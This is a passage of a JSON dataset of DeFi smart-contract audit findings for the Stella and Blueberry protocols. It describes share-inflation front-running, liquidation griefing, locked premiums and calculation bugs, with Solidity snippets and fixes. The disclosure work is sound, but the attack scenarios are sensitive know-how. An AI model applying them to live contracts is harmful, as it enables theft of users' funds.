      "summary": "\nThis bug report is about a potential attack in which an attacker can take advantage of a rounding down operation when calculating the amount of shares in a pool if the supply is non-zero. This attack can be done when the pool has no share supply and the amount of shares to be minted is equal to the assets provided. \n\nThe scenario described in the report is that Alice wants to deposit 2M * 1e6 USDC to a pool. Bob observes Alice's transaction, frontruns to deposit 1 wei USDC to mint 1 wei share, and transfers 1 M * 1e6 USDC to the pool. As a result, Alice receives 1 share, the pool has 3M*1e6 +1 assets and distributed 2 shares, and Bob profits 0.5 M while Alice loses 0.5 M USDC.\n\nThe team fixed the bug by increasing the interest-bearing token decimal by 18 to prevent attackers from manipulating the share price by precision loss, and made themself the first depositor to prevent potential attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Front-Running",
        "First Depositor Issue"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19047",
      "title": "TRST-H-3 The liquidated person can make the liquidator lose premium by adding collateral in advance",
      "impact": "HIGH",
      "content": "**Description:**\nWhen the position with **debtRatioE18 >= 1e18** or **startLiqTimestamp ! = 0**, the position can \nbe liquidated. On liquidation, the liquidator needs to pay premium, but the profit is related \nto the position's health factor and **deltaTime**, and when **discount == 0**, the liquidator loses \npremium.\n```solidity\n            uint deltaTime;\n            // 1.1 check the amount of time since position is marked\n            if (pos.startLiqTimestamp > 0) {\n                 deltaTime = Math.max(deltaTime, block.timestamp - pos.startLiqTimestamp);\n            }\n            // 1.2 check the amount of time since position is past the deadline\n             if (block.timestamp > pos.positionDeadline) {\n                    deltaTime = Math.max(deltaTime, block.timestamp - pos.positionDeadline);\n            }\n            // 1.3 cap time-based discount, as configured\n              uint timeDiscountMultiplierE18 = Math.max(\n                IConfig(config).minLiquidateTimeDiscountMultiplierE18(),\n                     ONE_E18 - deltaTime * IConfig(config).liquidateTimeDiscountGrowthRateE18()\n            );\n            // 2. calculate health-based discount factor\n            uint curHealthFactorE18 = (ONE_E18 * ONE_E18) /\n             getPositionDebtRatioE18(_positionManager, _user, _posId);\n                 uint minDesiredHealthFactorE18 = IConfig(config).minDesiredHealthFactorE18s(strategy);\n            // 2.1 interpolate linear health discount factor (according to the diagram in documentation)\n            uint healthDiscountMultiplierE18 = ONE_E18;\n             if (curHealthFactorE18 < ONE_E18) {\n                 healthDiscountMultiplierE18 = curHealthFactorE18 > minDesiredHealthFactorE18\n                     ? ((curHealthFactorE18 - minDesiredHealthFactorE18) * ONE_E18) /\n            (ONE_E18 - minDesiredHealthFactorE18)\n            : 0;\n            }\n            // 3. final liquidation discount = apply the two discount methods together\n            liquidationDiscountMultiplierE18 =\n            (timeDiscountMultiplierE18 * healthDiscountMultiplierE18) /\n            ONE_E18;\n```\nConsider the following scenario.\n1. Alice notices Bob's position with **debtRatioE18 >= 1e18** and calls `liquidatePosition()` to \nliquidate.\n2. Bob observes Alice's transaction, frontruns a call `markLiquidationStatus()` to make \n**startLiqTimestamp == block.timestamp**, and calls `adjustExtraColls()` to bring the position \nback to the health state.\n3. Alice's transaction is executed, and since the **startLiqTimestamp** of Bob's \n**position.startLiqTimestamp ! = 0**, it can be liquidated, but since **discount = 0**, Alice loses \npremium.\nThis breaks the protocol's liquidation mechanism and causes the liquidator not to launch \nliquidation for fear of losing assets, which will lead to more bad debts \n\n**Recommended Mitigation:**\nConsider having the liquidated person bear the premium, or at least have the liquidator use \nthe minDiscount parameter to set the minimum acceptable discount.\n\n**Team response:**\nLiquidator contracts can easily require the min amount in their own logic to ensure \nprofitability anyways.\n\nAdd **maxPayAmount** parameter as slippage control in the `liquidate()` and if \n**requiredPayAmount** exceeds the value, just revert.\n\n**Mitigation Review:**\nThe fix makes liquidators able to use the **maxPayAmount** parameter to prevent compromise \nin liquidation.\nIn addition, after discussing with the team, there are some external conditions / measures \nthat the team could make, which could lead to a lower severity, but the assigned severity is \nbased on the worst-case scenario.",
      "summary": "\nThis bug report describes a scenario in which Alice attempts to liquidate Bob's position, but due to Bob's quick action of frontrunning Alice's transaction and adjusting the position's health state, Alice ends up losing the premium she paid. This breaks the protocol's liquidation mechanism and could lead to more bad debts. The recommended mitigation is to have the liquidated party bear the premium, or the liquidator use the minDiscount parameter to set the minimum acceptable discount. The team suggested adding a maxPayAmount parameter as slippage control in the liquidate() function and reverting if the requiredPayAmount exceeds the value. This mitigation would allow liquidators to use the maxPayAmount parameter to prevent compromise in liquidation. The severity of the bug is based on the worst-case scenario.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19046",
      "title": "TRST-H-2 On liquidation, if netPnLE36 <= 0, the premium paid by the liquidator is locked in the contract.",
      "impact": "HIGH",
      "content": "**Description:**\nWhen liquidating a position, the liquidator is required to pay premium to Lender, which is \naccumulated in **sharingProfitTokenAmts** together with Lender's profit and paid to Lender in \n`_shareProfitsAndRepayAllDebts()`. \n```solidity\n        (\n        netPnLE36,\n             lenderProfitUSDValueE36,\n                 borrowTotalUSDValueE36,\n                     positionOpenUSDValueE36,\n                      sharingProfitTokenAmts ) = calcProfitInfo(_positionManager, _user, _posId);\n        // 2. add liquidation premium to the shared profit amounts\n                            uint lenderLiquidatationPremiumBPS = IConfig(config).lenderLiquidatePremiumBPS();\n                         for (uint i; i < sharingProfitTokenAmts.length; ) {\n                    sharingProfitTokenAmts[i] +=\n                (pos.openTokenInfos[i].borrowAmt * lenderLiquidatationPremiumBPS) / BPS;\n        unchecked {\n        ++i;\n        }\n        }\n```\nHowever, if **netPnLE36 <= 0**, `_shareProfitsAndRepayAllDebts()` will not pay any profit to \nLender and the premium in **sharingProfitTokenAmts** will also not be paid to Lender, which \nmeans that the premium paid by the liquidator will be locked in the contract.\n```solidity\n            function _shareProfitsAndRepayAllDebts( address _positionManager, address _posOwner, uint _posId,\n                    int _netPnLE36, uint[] memory _shareProfitAmts, address[] memory _tokens,\n                         OpenTokenInfo[] memory _openTokenInfos\n                              ) internal {\n                    // 0. load states\n            address _lendingProxy = lendingProxy;\n                    // 1. if net pnl is positive, share profits to lending proxy\n                 if (_netPnLE36 > 0) {\n            for (uint i; i < _shareProfitAmts.length; ) {\n                if (_shareProfitAmts[i] > 0) {\n                    ILendingProxy(_lendingProxy).shareProfit(_tokens[i], _shareProfitAmts[i]);\n                 }\n                     unchecked {\n                         ++i;\n                      }\n                  }\n            emit ProfitShared(_posOwner, _posId, _tokens, _shareProfitAmts);\n            }\n```\nAlso, when the position is closed, the tokens in the contract will be sent to the caller, so the \nnext person who closes the position will get the locked tokens.\n```solidity\n            underlyingAmts = new uint[](underlyingTokens.length);\n                    for (uint i; i < underlyingTokens.length; ) {\n                        underlyingAmts[i] = IERC20(underlyingTokens[i]).balanceOf(address(this));\n                             if (underlyingAmts[i] < _params.minUnderlyingAmts[i]) {\n                                 revert TokenAmountLessThanExpected(\n                         underlyingTokens[i],\n                      underlyingAmts[i],\n                 _params.minUnderlyingAmts[i]\n              );\n            }\n            _doRefund(underlyingTokens[i], underlyingAmts[i]);\n                 unchecked {\n                      ++i;\n                  }\n```\n\n**Recommended Mitigation:**\nModify `shareProfitsAndRepayAllDebts()` as follows:\n```solidity\n            function _shareProfitsAndRepayAllDebts(\n                     address _positionManager,\n                         address _posOwner,\n                            uint _posId,\n                            int _netPnLE36,\n                             uint[] memory _shareProfitAmts,\n                            address[] memory _tokens,\n                        OpenTokenInfo[] memory _openTokenInfos\n                      ) internal {\n                  // 0. load states\n                 address _lendingProxy = lendingProxy;\n                // 1. if net pnl is positive, share profits to lending proxy\n            - if (_netPnLE36 > 0) {\n                for (uint i; i < _shareProfitAmts.length; ) {\n            if (_shareProfitAmts[i] > 0) {\n                ILendingProxy(_lendingProxy).shareProfit(_tokens[i], _shareProfitAmts[i]);\n            }\n            unchecked {\n            ++i;\n            }\n            }\n            emit ProfitShared(_posOwner, _posId, _tokens, _shareProfitAmts);\n            - }\n```\n\n**Team Response:**\nFixed\n\n**Mitigation Review:**\nThe team has fixed it as recommended to make the logic correct.",
      "summary": "\nThis bug report is about an issue with the liquidation process in a lending platform. The liquidator is required to pay a premium to the lender, which is accumulated in sharingProfitTokenAmts together with the lender's profit and paid to the lender in _shareProfitsAndRepayAllDebts(). However, if netPnLE36 is less than or equal to 0, the _shareProfitsAndRepayAllDebts() will not pay any profit to the lender and the premium in sharingProfitTokenAmts will also not be paid to the lender, meaning that the premium paid by the liquidator will be locked in the contract. Additionally, when the position is closed, the tokens in the contract will be sent to the caller, thus the next person who closes the position will get the locked tokens. \n\nThe team has fixed the issue by modifying the _shareProfitsAndRepayAllDebts() function as recommended. The mitigation review states that the team has fixed the logic correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "19045",
      "title": "TRST-H-1 Incorrect implementation of getProfitSharingE18() greatly reduces Lender's yield",
      "impact": "HIGH",
      "content": "**Description:**\n`ProfitSharingModel.getProfitSharingE18()` calculates the share of profit that Lender gets \nbased on the APR of the position. According to the formula, the higher the APR, the lower \nthe share of profit the Lender gets, but due to the wrong implementation of the \n`getProfitSharingE18()` function, if the APR is smaller than **MAX_ANNUALIZED_YEILD**, the \nbase share of 25% is returned, actually 25% should be returned when the APR is larger than \n**MAX_ANNUALIZED_YEILD**.\nConsidering an APR of 5%, Lender's share of the profit should be 77%, while \ngetProfitSharingE18() returns 25%, which greatly reduces Lender's share of the profit.\n\n**Recommended Mitigation:**\nModify `getProfitSharingE18()` as follows \n```solidity\n            - if (_annualizedYieldE18 < MAX_ANNUALIZED_YEILD) {\n            + if (_annualizedYieldE18 >= MAX_ANNUALIZED_YEILD) { \n            return 0.25e18;\n            }\n```\n\n**Team response:**\nFixed\n\n**Mitigation Review:**\nThe team has fixed it as recommended to make the logic correct",
      "summary": "\nThis bug report is about the wrong implementation of the `getProfitSharingE18()` function in the ProfitSharingModel. This function calculates the share of profit that Lender gets based on the APR of the position. According to the formula, the higher the APR, the lower the share of profit the Lender gets. However, the bug was that if the APR was smaller than the MAX_ANNUALIZED_YEILD, the base share of 25% was returned instead of the calculated share of profit. \n\nFor example, considering an APR of 5%, the Lender's share of the profit should be 77%, while getProfitSharingE18() returned 25%, which greatly reduced the Lender's share of the profit.\n\nThe team recommended to modify `getProfitSharingE18()` as follows:\n```solidity\n            - if (_annualizedYieldE18 < MAX_ANNUALIZED_YEILD) {\n            + if (_annualizedYieldE18 >= MAX_ANNUALIZED_YEILD) { \n            return 0.25e18;\n            }\n```\n\nThe team has fixed the bug as recommended to make the logic correct.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Stella",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-29-Stella.md",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "18512",
      "title": "M-3: Updating the feeManger on config will cause desync between bank and vaults",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/32 \n\n## Found by \n0x52\n## Summary\n\nWhen the bank is initialized it caches the current config.feeManager. This is problematic since feeManger can be updated in config. Since it is precached the address in bank will not be updated leading to a desync between contracts the always pull the freshest value for feeManger and bank.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L142\n\n        feeManager = config_.feeManager();\n\nAbove we see that feeManger is cached during initialization.\n\n https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/vault/HardVault.sol#L140-L143\n\n        withdrawAmount = config.feeManager().doCutVaultWithdrawFee(\n            address(uToken),\n            shareAmount\n        );\n\nThis is in direct conflict with other contracts the always use the freshest value. This is problematic for a few reasons. The desync will lead to inconsistent fees across the ecosystem either charging users too many fees or not enough.\n\n## Impact\n\nAfter update users will experience inconsistent fees across the ecosystem\n\n## Code Snippet\n\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L142\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBlueBerryBank should always use config.feeManger instead of caching it.",
      "summary": "\nThis bug report is about the issue M-3, which is related to the desync between the bank and the vaults due to the updating of the feeManager on the config. It was found by 0x52 and the impact of this issue is that users will experience inconsistent fees across the ecosystem after the update. The code snippet for this issue is from the BlueBerryBank.sol file at line 142. This issue was found using manual review and the recommendation is that BlueBerryBank should always use the config.feeManger instead of caching it.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/32",
      "tags": [
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18511",
      "title": "M-2: ShortLongSpell#openPosition attempts to burn wrong token",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/30 \n\n## Found by \n0x52\n## Summary\n\nShortLongSpell#openPosition attempts to burn vault.uToken when it should be using vault instead. The result is that ShortLongSpell#openPosition will be completely nonfunctional when the user is adding to their position\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L133-L140\n\n            address burnToken = address(ISoftVault(strategy.vault).uToken());\n            if (collSize > 0) {\n                if (posCollToken != address(wrapper))\n                    revert Errors.INCORRECT_COLTOKEN(posCollToken);\n                bank.takeCollateral(collSize);\n                wrapper.burn(burnToken, collSize);\n                _doRefund(burnToken);\n            }\n\nWe see above that the contract attempts to withdraw vault.uToken from the wrapper.\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L145-L150\n\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n\nThis is in direct conflict with the collateral that is actually deposited which is vault. This will cause the function to always revert when adding to an existing position.\n\n## Impact\n\nShortLongSpell#openPosition will be completely nonfunctional when the user is adding to their position\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBurn token should be vault rather than vault.uToken",
      "summary": "\nThis bug report is about a problem with the ShortLongSpell#openPosition function in the 2023-05-blueberry-judging repository. The issue is that the function attempts to burn vault.uToken when it should be using vault instead, resulting in the function being completely nonfunctional when the user is adding to their position. The code snippet that is causing the issue can be found at https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151. The bug was found by 0x52 using manual review. The recommendation to fix the issue is to burn token should be vault rather than vault.uToken.",
      "quality_score": 2,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/30",
      "tags": [
        "Coding-Bug"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18510",
      "title": "M-1: BalancerPairOracle#getPrice will revert due to division by zero in some cases",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/25 \n\n## Found by \n0x52, nobody2018\n## Summary\n\n`BalancerPairOracle#getPrice` internally calls `computeFairReserves`, which returns fair reserve amounts given spot reserves, weights, and fair prices. When the parameter `resA` passed to `computeFairReserves` is smaller than `resB`, division by 0 will occur.\n\n## Vulnerability Detail\n\nIn `BalancerPairOracle#getPrice`, resA and resB passed to `computeFairReserves` are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n\n```solidity\nfunction computeFairReserves(\n        uint256 resA,\n        uint256 resB,\n        uint256 wA,\n        uint256 wB,\n        uint256 pxA,\n        uint256 pxB\n    ) internal pure returns (uint256 fairResA, uint256 fairResB) {\n    \t...\n    \t//@audit r0 = 0 when resA < resB.\n->      uint256 r0 = resA / resB;\n        uint256 r1 = (wA * pxB) / (wB * pxA);\n        // fairResA = resA * (r1 / r0) ^ wB\n        // fairResB = resB * (r0 / r1) ^ wA\n        if (r0 > r1) {\n            uint256 ratio = r1 / r0;\n            fairResA = resA * (ratio ** wB);\n            fairResB = resB / (ratio ** wA);\n        } else {\n->          uint256 ratio = r0 / r1;\t\t// radio = 0 when r0 = 0\n->          fairResA = resA / (ratio ** wB);   \t// revert divided by 0\n            fairResB = resB * (ratio ** wA);\n        }\n    }\n```\n\nAnother case is **when the decimals of tokenA is smaller than the decimals of tokenB**, such as usdc(e6)-weth(e18).\n\n## Impact\n\nAll functions that subcall `BalancerPairOracle#getPrice` will be affected.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L35-L66\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```diff\n--- a/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n+++ b/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n@@ -50,7 +50,7 @@ contract BalancerPairOracle is UsingBaseOracle, IBaseOracle {\n         // --> fairResA / r1^wB = constant product\n         // --> fairResA = resA^wA * resB^wB * r1^wB\n         // --> fairResA = resA * (resB/resA)^wB * r1^wB = resA * (r1/r0)^wB\n-        uint256 r0 = resA / resB;\n+        uint256 r0 = resA * 10**(decimalsB) / resB;\n         uint256 r1 = (wA * pxB) / (wB * pxA);\n         // fairResA = resA * (r1 / r0) ^ wB\n         // fairResB = resB * (r0 / r1) ^ wA\n```\n\n\n\n## Discussion\n\n**securitygrid**\n\nEscalate for 10 USDC\nThis is a valid M/H. Please review **Vulnerability Detail** of this report, it describes 2 cases:\n1. resA and resB passed to computeFairReserves are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n2. when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).\n\n**This issue is same root as #28**.\nThe impact described in #28 is only possible if the dp of the two tokens are different. But it is not completely correct, because when the dp of token0 is less than the dp of token1, a division by zero error occurs, such as token0(e6)-token1(e18).\nMerging the two reports is the best description.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> This is a valid M/H. Please review **Vulnerability Detail** of this report, it describes 2 cases:\n> 1. resA and resB passed to computeFairReserves are the balance of TokenA and TokenB of the pool respectively. It is common for the balance of TokenB to be greater than the balance of TokenA.\n> 2. when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18).\n> \n> **This issue is same root as #28**.\n> The impact described in #28 is only possible if the dp of the two tokens are different. But it is not completely correct, because when the dp of token0 is less than the dp of token1, a division by zero error occurs, such as token0(e6)-token1(e18).\n> Merging the two reports is the best description.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nAgreed with escalation. This and #28 are dupes and this does a better job of describing the issue so it should be the main issue. Additionally given that the contract would become nonfunctional rather than return an incorrect price, I agree with the watson's original severity of medium.\n\n**hrishibhat**\n\nEscalation accepted\n\nValid medium\nMaking this issue the main one and #28 a duplicate of this issue. \n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid medium\n> Making this issue the main one and #28 a duplicate of this issue. \n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue in BalancerPairOracle#getPrice which can cause a transaction to revert due to division by zero in some cases. It was found by 0x52 and nobody2018. \n\nThe issue is caused by the `computeFairReserves` function, which is called by `BalancerPairOracle#getPrice`. When the parameter `resA` passed to `computeFairReserves` is smaller than `resB`, division by 0 will occur. This is common for the balance of TokenB to be greater than the balance of TokenA. Another case is when the decimals of tokenA is smaller than the decimals of tokenB, such as usdc(e6)-weth(e18). \n\nAll functions that subcall `BalancerPairOracle#getPrice` will be affected. The code snippet can be found at https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/oracle/BalancerPairOracle.sol#L35-L66. The tool used to find this bug was Manual Review. \n\nThe recommendation is to modify the code as follows:\n\n```diff\n--- a/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n+++ b/blueberry-core/contracts/oracle/BalancerPairOracle.sol\n@@ -50,7 +50,7 @@ contract BalancerPairOracle is UsingBaseOracle, IBaseOracle {\n         // --> fairResA / r1^wB = constant product\n         // --> fairResA = resA^wA * resB^wB * r1^wB\n         // --> fairResA = resA * (resB/resA)^wB * r1^wB = resA * (r1/r0)^wB\n-        uint256 r0 = resA / resB;\n+        uint256 r0 = resA * 10**(decimalsB) / resB;\n         uint256 r1 = (wA * pxB) / (wB * pxA);\n         // fairResA = resA * (r1 / r0) ^",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/25",
      "tags": [
        "Wrong Math",
        "Missing-Logic",
        "Decimals"
      ],
      "finders": [
        "0x52",
        "nobody2018"
      ]
    },
    {
      "id": "18509",
      "title": "H-2: ShortLongSpell#openPosition uses the wrong balanceOf when determining how much collateral to put",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/31 \n\n## Found by \n0x52\n## Summary\n\nThe _doPutCollateral subcall in ShortLongSpell#openPosition uses the balance of the uToken rather than the vault resulting in the vault tokens being left in the contract which will be stolen.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L144-L150\n\n        address vault = strategies[param.strategyId].vault;\n        _doPutCollateral(\n            vault,\n            IERC20Upgradeable(ISoftVault(vault).uToken()).balanceOf(\n                address(this)\n            )\n        );\n\nWhen putting the collateral the contract is putting vault but it uses the balance of the uToken instead of the balance of the vault.\n\n## Impact\n\nVault tokens will be left in contract and stolen\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L111-L151\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse the balanceOf vault rather than vault.uToken\n\n\n\n## Discussion\n\n**sleepriverfish**\n\nEscalate for 10 USDC\n\nIn #Blueberry Update, despite the successful escalation of the issue, no reward was granted for the heightened severity and impact of the vulnerability. However, in #Blueberry Update2, a reward was offered specifically for the detection and reporting of a similar vulnerability.\nhttps://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> In #Blueberry Update, despite the successful escalation of the issue, no reward was granted for the heightened severity and impact of the vulnerability. However, in #Blueberry Update2, a reward was offered specifically for the detection and reporting of a similar vulnerability.\n> https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/116\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nThis issue has been escalated in the first contest and should be valid in both\n\n**hrishibhat**\n\nEscalation accepted\n\nThis is a valid issue, and necessary decisions have been taken in the respective issue from the previous contest. \n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> This is a valid issue, and necessary decisions have been taken in the respective issue from the previous contest. \n> \n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the ShortLongSpell#openPosition subcall in the Smart Contract of the Blueberry project. The issue is that the contract uses the balance of the uToken rather than the balance of the vault when determining how much collateral to put. This results in the vault tokens being left in the contract, which can be stolen. The code snippet that is causing the issue is located at https://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L144-L150. The bug was found by 0x52 and manual review was used as a tool. The impact is that vault tokens will be left in contract and stolen. The recommendation is to use the balanceOf vault rather than vault.uToken. The bug was escalated for 10 USDC and the escalation was accepted. This issue was already escalated in the first contest and the necessary decisions have been taken in the respective issue from the previous contest. The contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/31",
      "tags": [
        "External Contract",
        "Fund Lock",
        "Coding-Bug"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18508",
      "title": "H-1: AuraSpell#openPositionFarm fails to return all rewards to user",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/29 \n\n## Found by \n0x52, nobody2018\n## Summary\n\nWhen a user adds to an existing position on AuraSpell, the contract burns their current position and remints them a new one. The issues is that WAuraPool will send all reward tokens to the contract but it only sends Aura back to the user, causing all other rewards to be lost.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L256-L261\n\n        for (uint i = 0; i < rewardTokens.length; i++) {\n            IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n                msg.sender,\n                rewards[i]\n            );\n        }\n\nInside WAuraPools#burn reward tokens are sent to the user.\n\nhttps://github.com/sherlock-audit/2023-05-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L130-L140\n\n        IBank.Position memory pos = bank.getCurrentPositionInfo();\n        if (pos.collateralSize > 0) {\n            (uint256 pid, ) = wAuraPools.decodeId(pos.collId);\n            if (param.farmingPoolId != pid)\n                revert Errors.INCORRECT_PID(param.farmingPoolId);\n            if (pos.collToken != address(wAuraPools))\n                revert Errors.INCORRECT_COLTOKEN(pos.collToken);\n            bank.takeCollateral(pos.collateralSize);\n            wAuraPools.burn(pos.collId, pos.collateralSize);\n            _doRefundRewards(AURA);\n        }\n\nWe see above that the contract only refunds Aura to the user causing all other extra reward tokens received by the contract to be lost to the user.\n\n## Impact\n\nUser will lose all extra reward tokens from their original position\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWAuraPool returns the reward tokens it sends. Use this list to refund all tokens to the user\n\n\n\n## Discussion\n\n**sleepriverfish**\n\nEscalate for 10 USDC.\nThe issue was  excluded from #Blueberry Update, it appears to have been rewarded in #Blueberry Update 2.\nhttps://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> The issue was  excluded from #Blueberry Update, it appears to have been rewarded in #Blueberry Update 2.\n> https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**securitygrid**\n\nEscalate for 10 USDC\nvalid H. Nobody escalated [it](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42) \n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> valid H. Nobody escalated [it](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42) \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nAgreed with second escalation\n\n**sleepriverfish**\n\nSo, the issue https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/42 considered invalid? I believe it should be categorized and rewarded in some way.\n\n**hrishibhat**\n\nEscalation rejected\n\nValid high\nThe issue mentioned above has been resolved accordingly in the respective contest. \n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Valid high\n> The issue mentioned above has been resolved accordingly in the respective contest. \n\n    This issue's escalations have been rejected!\n\n    Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nA bug report has been raised in the Sherlock Audit repository about an issue with the AuraSpell#openPositionFarm contract. It was found by 0x52 and nobody2018 and is related to the WAuraPool contract. The issue is that when a user adds to an existing position on AuraSpell, the contract burns their current position and remints them a new one. However, the WAuraPool contract only sends the Aura token back to the user, causing all other rewards to be lost. \n\nThe vulnerability detail is that inside the WAuraPools#burn function, reward tokens are sent to the user. However, in the AuraSpell#openPositionFarm function, the contract only refunds Aura to the user, causing all other extra reward tokens received by the contract to be lost to the user. \n\nThe impact of this bug is that users will lose all extra reward tokens from their original position.\n\nThe tool used to identify this bug was manual review. The recommendation is that WAuraPool should be modified to return the reward tokens it sends. This list should then be used to refund all tokens to the user.\n\nThe issue was discussed and it was decided that the issue mentioned previously had been resolved accordingly in the respective contest, so the escalation was rejected. Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "quality_score": 3,
